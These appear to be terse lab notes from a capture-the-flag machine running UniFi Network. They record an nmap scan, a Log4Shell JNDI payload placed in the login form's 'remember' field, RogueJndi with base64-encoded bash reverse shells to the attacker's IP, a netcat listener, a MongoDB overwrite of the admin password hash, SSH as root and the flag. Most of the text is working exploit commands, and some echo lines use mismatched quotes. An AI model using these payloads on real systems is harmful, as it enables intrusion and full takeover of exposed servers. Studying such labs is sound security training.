

![[Pasted image 20260722030848.png]]



```
nmap -sV -A -T4 10.129.171.213       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 10:24 -0400
Nmap scan report for 10.129.171.213
Host is up (0.25s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http            Apache Tomcat (language: en)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.171.213:8443/manage
8443/tcp open  ssl/nagios-nsca Nagios NSCA
|_ssl-date: TLS randomness does not represent time
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   281.96 ms 10.10.14.1
2   282.07 ms 10.129.171.213


```

![[Pasted image 20260720205919.png]]

![[Pasted image 20260720210002.png]]

![[Pasted image 20260720210258.png]]


![[Pasted image 20260721220308.png]]




![[Pasted image 20260721220215.png]]

```
git clone https://github.com/veracode-research/rogue-jndi  
cd rogue-jndi  
mvn package
```


![[Pasted image 20260721221825.png]]

```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuNTYvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i} --hostname “10.10.15.56"

```

```
echo ‘bash -c “bash -i >/dev/tcp/10.10.15.56/4444 0>&1”’ | base64
```

{"username":"admin","password":"jack","remember":
"${jndi:ldap://10.10.14.205:1389/o=tomcat}",
"strict":true}

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMjA1LzQ0NDQgMD4mMSI=
}|{base64,-d}|{bash,-i} --hostname “10.10.14.205" 


_echo ‘bash -c bash -i >&/dev/tcp/10.10.14.252/4444 0>&1’ | base64_

java -jar  /target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjA1LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.205"

{"username":"admin","password":"jack","remember":
"${jndi:ldap://10.10.14.205:1389/o=tomcat}",
"strict":true}


![[Pasted image 20260722020631.png]]


![[Pasted image 20260722020716.png]]


```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.205] from (UNKNOWN) [10.129.176.210] 52778
whoami
unifi
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ 

```


```
unifi@unified:/home/michael$ ps aux | grep mongo
ps aux | grep mongo
unifi         67  0.5  4.1 1069948 84808 ?       Sl   20:59   0:03 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi        431  0.0  0.0  11468  1068 pts/0    S+   21:09   0:00 grep mongo
unifi@unified:/home/michael$ 

```

```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"


```


![[Pasted image 20260722021529.png]]


```
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"Password1234"}})'
```


![[Pasted image 20260722022139.png]]



```
administrator

Password1234
```

![[Pasted image 20260722025724.png]]

![[Pasted image 20260722025843.png]]


![[Pasted image 20260722025911.png]]

![[Pasted image 20260722025955.png]]


```
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$hL7jbGbjRcgFBDqA$OYtuHNdKp5zVOYIAbx7k4FI9aghr7v9kvL1Iy6iOVliLj7ClcZFiIo16OS0FwH43znSEPwb6NO0ec2RvRaT6S/"}})'
```



```
ssh user:root
pass:NotACrackablePassword4U2022
```

![[Pasted image 20260722030352.png]]

```
sshpass -p 'NotACrackablePassword4U2022' ssh -o StrictHostKeyChecking=no root@10.129.176.210

```

```
root@unified:~# pwd
/root
root@unified:~# ls
root.txt
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681
root@unified:~# 

```

![[Pasted image 20260722030758.png]]
